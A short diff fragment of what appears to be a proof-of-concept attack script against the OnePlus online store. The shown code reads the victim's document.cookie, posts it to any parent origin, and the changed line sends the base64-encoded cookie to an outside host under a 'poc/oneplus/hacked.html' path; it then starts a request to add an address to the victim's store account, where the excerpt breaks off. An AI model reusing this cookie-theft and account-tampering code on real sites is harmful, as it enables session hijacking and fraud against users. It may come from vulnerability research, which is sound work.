@@ -7,7 +7,7 @@ var data = document.cookie;
 window.parent.postMessage(document.cookie,"*");
 
 //retrieve cookie from oneplus
-window.opener.oneplus(data);
+window.open("https://koffdsa.github.com/poc/oneplus/hacked.html?cookie="+window.btoa(data),'_blank');
 
 //add address to the victim and set default
 fetch("https://store.oneplus.com/xman/useraddress/add", {
